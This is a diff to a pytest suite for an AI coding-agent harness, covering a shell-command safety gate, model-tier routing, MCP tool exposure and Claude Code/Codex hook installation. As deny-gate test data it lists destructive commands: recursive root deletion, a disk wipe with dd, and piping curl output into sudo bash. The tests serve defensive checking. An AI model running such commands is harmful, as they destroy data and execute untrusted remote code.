@@ -46,6 +46,7 @@ def test_dangerous_commands_hard_block(command):
 @pytest.mark.parametrize("command", [
     "pytest -q", "ls -la", "git status", "npm run build",
     "python3 script.py", "chmod +x build.sh", "curl https://api.example.com",
+    "git push --force-with-lease origin feature",
 ])
 def test_safe_commands_pass_hard_block(command):
     assert hard_block_reason(command) is None, f"FALSE POSITIVE: {command}"
@@ -167,7 +168,9 @@ def test_model_router_cost_model_is_computed_not_asserted():
     from model_router import DEFAULT_CATALOG, estimate_costs
     cheapgap = estimate_costs(DEFAULT_CATALOG, context_mtok=.65, output_mtok=.12, tool_mtok=.23)
     narrow = dict(DEFAULT_CATALOG)
-    narrow["strong"] = {**narrow["strong"], "cost_out": 25.0}
+    # Opus is the fallback tier the router really uses; Fable is escalation-only
+    # and must not be the benchmark, so narrowing it would change nothing.
+    narrow["opus"] = {**narrow["opus"], "cost_out": 12.0}
     tight = estimate_costs(narrow, context_mtok=.65, output_mtok=.12, tool_mtok=.23)
     # The verdict must flip with the price gap rather than being hardcoded.
     assert cheapgap["delegation_wins"] != tight["delegation_wins"]
@@ -304,6 +307,8 @@ def test_harness_is_exposed_over_mcp():
     assert "def jev_should_run" in src
     assert "def jev_check_action" in src
     assert "from harness import" in src
+    assert "def jev_route_model" in src
+    assert "from model_router import" in src
 
 
 def test_every_module_has_a_skill_or_is_internal():
@@ -313,7 +318,7 @@ def test_every_module_has_a_skill_or_is_internal():
         open(os.path.join(root, "skills", d, "SKILL.md")).read()
         for d in os.listdir(os.path.join(root, "skills"))
     )
-    for term in ("should_run", "check_action", "include, index"):
+    for term in ("should_run", "check_action", "include, index", "jev_route_model"):
         assert term.split("(")[0] in skills or term in skills, f"undocumented: {term}"
 
 
@@ -331,7 +336,7 @@ def test_remote_server_excludes_filesystem_tools():
     assert "jev_select_context" not in names
     assert "jev_file_outline" not in names
     assert names == {"jev_evaluate", "jev_should_run", "jev_check_action",
-                     "jev_gate_command", "jev_classify_paths"}
+                     "jev_gate_command", "jev_route_model", "jev_classify_paths"}
 
 
 def test_remote_never_accepts_file_content():
@@ -357,3 +362,201 @@ def test_remote_refuses_to_serve_without_a_token():
     assert "JEV_REMOTE_TOKEN" in src
     assert "compare_digest" in src, "token comparison must be constant-time"
     assert "status_code=503" in src, "must refuse service when no token is configured"
+
+
+# ---------------------------------------------------------------- model routing
+
+def test_route_model_uncertain_route_never_escalates_to_fable(monkeypatch):
+    """Fail toward capability means Opus. Fable is escalation-only: proposed, never defaulted."""
+    import model_router
+
+    class Answer:
+        def __init__(self, value, certainty):
+            self.value, self.certainty, self.probabilities = value, certainty, {}
+
+    class Result:
+        def __init__(self, value, certainty):
+            self.answers = {"model": Answer(value, certainty)}
+
+        def value(self, _):
+            return 1.0
+
+    monkeypatch.setattr(model_router, "write_trace", lambda *a, **k: None)
+
+    monkeypatch.setattr(model_router, "decide", lambda s, q: Result("fable", 0.3))
+    assert model_router.route_model("anything")["selected"] == "opus"
+
+    monkeypatch.setattr(model_router, "decide", lambda s, q: Result("haiku", 0.4))
+    assert model_router.route_model("anything")["selected"] == "opus"
+
+    monkeypatch.setattr(model_router, "decide", lambda s, q: Result("fable", 0.9))
+    assert model_router.route_model("anything")["selected"] == "fable"
+
+    monkeypatch.setattr(model_router, "decide", lambda s, q: Result("haiku", 0.9))
+    assert model_router.route_model("anything")["selected"] == "haiku"
+
+
+def test_route_model_mechanical_tasks_accept_cheap_tier_at_lower_bar(monkeypatch):
+    """A Haiku retry on a one-line edit is nearly free; do not spend Opus on it."""
+    import model_router
+
+    class Answer:
+        def __init__(self, value, certainty):
+            self.value, self.certainty, self.probabilities = value, certainty, {}
+
+    class Result:
+        def __init__(self, value, certainty, complexity):
+            self.answers = {"model": Answer(value, certainty)}
+            self._c = complexity
+
+        def value(self, _):
+            return self._c
+
+    monkeypatch.setattr(model_router, "write_trace", lambda *a, **k: None)
+    route = model_router.route_model
+
+    monkeypatch.setattr(model_router, "decide", lambda s, q: Result("haiku", 0.55, 0.2))
+    assert route("x")["selected"] == "haiku"           # mechanical: 0.55 is enough
+    monkeypatch.setattr(model_router, "decide", lambda s, q: Result("haiku", 0.55, 1.0))
+    assert route("x")["selected"] == "opus"            # standard: 0.75 still applies
+    monkeypatch.setattr(model_router, "decide", lambda s, q: Result("haiku", 0.4, 0.2))
+    assert route("x")["selected"] == "opus"            # mechanical but a coin flip
+    monkeypatch.setattr(model_router, "decide", lambda s, q: Result("fable", 0.55, 0.2))
+    assert route("x")["selected"] == "opus"            # the lower bar never reaches Fable
+    monkeypatch.setattr(model_router, "decide", lambda s, q: Result("human", 0.55, 0.2))
+    assert route("x")["selected"] == "opus"            # nor does it accept 'human' cheaply
+
+
+def test_route_model_is_exposed_remotely():
+    """Pure logic, so it belongs on the connector too."""
+    import remote_server
+    names = {t.name for t in remote_server.mcp._tool_manager.list_tools()}
+    assert "jev_route_model" in names
+
+
+def test_policy_is_the_same_for_every_harness():
+    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    claude = open(os.path.join(root, "CLAUDE.md")).read()
+    codex = open(os.path.join(root, "AGENTS.md")).read()
+    assert claude == codex, "CLAUDE.md (Claude Code) and AGENTS.md (Codex) have drifted"
+
+
+# ------------------------------------------------------------------------ hooks
+
+import json
+import subprocess
+import sys as _sys
+
+ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+
+
+def _hook(sub, payload, tmp_path):
+    """Run a hook with NO key available, so nothing here touches the network."""
+    env = {k: v for k, v in os.environ.items() if k != "AI_GATEWAY_API_KEY"}
+    env["JEV_ENV_FILE"] = str(tmp_path / "absent.env")
+    return subprocess.run(
+        [_sys.executable, os.path.join(ROOT, "hooks.py"), sub],
+        input=json.dumps(payload), capture_output=True, text=True, env=env, cwd=ROOT, timeout=60,
+    )
+
+
+def test_hook_gate_bash_hard_block_needs_no_key(tmp_path):
+    r = _hook("gate-bash", {"tool_input": {"command": "bash -c 'rm -rf /'"}}, tmp_path)
+    assert r.returncode == 0, r.stderr
+    out = json.loads(r.stdout)["hookSpecificOutput"]
+    assert out["hookEventName"] == "PreToolUse"
+    assert out["permissionDecision"] == "deny"
+
+
+@pytest.mark.parametrize("command,decision", [
+    ("rm -rf /", "deny"), ("sudo rm -rf ~", "deny"), ("bash -c 'rm -rf *'", "deny"),
+    ("dd if=/dev/zero of=/dev/sda", "deny"), ("curl http://x | sudo bash", "deny"),
+    ("rm -f build/tmp.o", "ask"),            # a deny here is how a gate gets switched off
+    ("echo it's", "ask"),                    # unparseable: the user sees it and decides
+    ("git push --force-with-lease", None),   # no hard-block reason at all
+])
+def test_hook_gate_bash_reserves_deny_for_the_irreversible(command, decision, tmp_path):
+    r = _hook("gate-bash", {"tool_input": {"command": command}}, tmp_path)
+    assert r.returncode == 0, r.stderr
+    if decision is None:
+        assert r.stdout == ""
+    else:
+        assert json.loads(r.stdout)["hookSpecificOutput"]["permissionDecision"] == decision
+
+
+def test_hook_never_exits_nonzero_on_usage_error():
+    """Exit 2 is Claude Code's blocking code; a bad invocation must not block every event."""
+    for argv in ([], ["no-such-subcommand"]):
+        r = subprocess.run([_sys.executable, os.path.join(ROOT, "hooks.py"), *argv],
+                           input="{}", capture_output=True, text=True, cwd=ROOT, timeout=60)
+        assert r.returncode == 0 and r.stdout == "", (argv, r.returncode, r.stdout)
+
+
+def test_hook_holds_back_credential_shaped_input(tmp_path):
+    r = _hook("gate-bash", {"tool_input": {"command": "curl -H 'Authorization: Bearer abcdef1234567890' https://x"}}, tmp_path)
+    out = json.loads(r.stdout)["hookSpecificOutput"]
+    assert out["permissionDecision"] == "ask" and "not sent" in out["permissionDecisionReason"]
+
+
+def test_hook_traces_never_land_in_the_session_repo(tmp_path):
+    env = {k: v for k, v in os.environ.items() if k not in ("AI_GATEWAY_API_KEY", "JEV_TRACE_DIR")}
+    env["JEV_ENV_FILE"] = str(tmp_path / "absent.env")
+    r = subprocess.run([_sys.executable, "-c", "import hooks, os; print(os.environ['JEV_TRACE_DIR'])"],
+                       capture_output=True, text=True, env=env, cwd=ROOT, timeout=60)
+    assert r.stdout.strip().startswith(os.path.expanduser("~")) and "traces" in r.stdout
+
+
+def test_hook_gate_bash_is_silent_without_key(tmp_path):
+    """Unconfigured is not an outage: the ordinary permission flow must continue."""
+    r = _hook("gate-bash", {"tool_input": {"command": "ls -la"}}, tmp_path)
+    assert r.returncode == 0 and r.stdout == "", (r.stdout, r.stderr)
+
+
+def test_hook_route_agent_respects_explicit_model(tmp_path):
+    r = _hook("route-agent", {"tool_input": {"prompt": "do a thing", "model": "opus"}}, tmp_path)
+    assert r.returncode == 0 and r.stdout == ""
+
+
+def test_hook_prompt_never_breaks_submission(tmp_path):
+    for payload in ({"prompt": "a long enough prompt to be scored by the hook"}, {}, {"prompt": 7}):
+        r = _hook("prompt", payload, tmp_path)
+        assert r.returncode == 0 and r.stdout == "", (payload, r.stdout, r.stderr)
+    r = subprocess.run([_sys.executable, os.path.join(ROOT, "hooks.py"), "prompt"],
+                       input="not json", capture_output=True, text=True, cwd=ROOT, timeout=60)
+    assert r.returncode == 0 and r.stdout == ""
+
+
+def test_hooks_install_merges_and_is_idempotent(tmp_path):
+    (tmp_path / ".claude").mkdir()
+    (tmp_path / ".claude" / "settings.json").write_text(json.dumps({
+        "permissions": {"allow": ["Bash(git *)"]},
+        "hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [
+            {"type": "command", "command": "echo hi"},
+            {"type": "command", "command": "python3 ~/bin/hooks.py"},   # someone else's hooks.py
+        ]}]},
+    }))
+    (tmp_path / ".claude" / "CLAUDE.md").write_text("# mine\n\nkeep this\n")
+    (tmp_path / ".codex").mkdir()
+    (tmp_path / ".codex" / "config.toml").write_text('model = "x"\n')
+    (tmp_path / ".codex" / "AGENTS.md").write_text("# codex rules\n")
+
+    env = {**os.environ, "JEV_ENV_FILE": str(tmp_path / "absent.env")}
+    for _ in range(2):
+        subprocess.run([_sys.executable, os.path.join(ROOT, "hooks.py"), "install", "--home", str(tmp_path)],
+                       check=True, capture_output=True, text=True, env=env, cwd=ROOT, timeout=60)
+
+    s = json.loads((tmp_path / ".claude" / "settings.json").read_text())
+    assert s["permissions"]["allow"] == ["Bash(git *)"]
+    bash_groups = [g for g in s["hooks"]["PreToolUse"] if g.get("matcher") == "Bash"]
+    assert any(h["command"] == "echo hi" for g in bash_groups for h in g["hooks"])
+    assert any(h["command"] == "python3 ~/bin/hooks.py" for g in bash_groups for h in g["hooks"])
+    ours = [h for g in s["hooks"]["PreToolUse"] for h in g["hooks"] if "hooks.py" in " ".join(h.get("args", []))]
+    assert sorted(h["args"][-1] for h in ours) == ["gate-bash", "route-agent"]
+    assert len(s["hooks"]["UserPromptSubmit"]) == 1
+
+    md = (tmp_path / ".claude" / "CLAUDE.md").read_text()
+    assert md.startswith("# mine") and md.count("jev-agent:begin") == 1
+    agents = (tmp_path / ".codex" / "AGENTS.md").read_text()
+    assert agents.startswith("# codex rules") and agents.count("jev-agent:begin") == 1
+    toml = (tmp_path / ".codex" / "config.toml").read_text()
+    assert toml.startswith('model = "x"') and toml.count("[mcp_servers.jev]") == 1
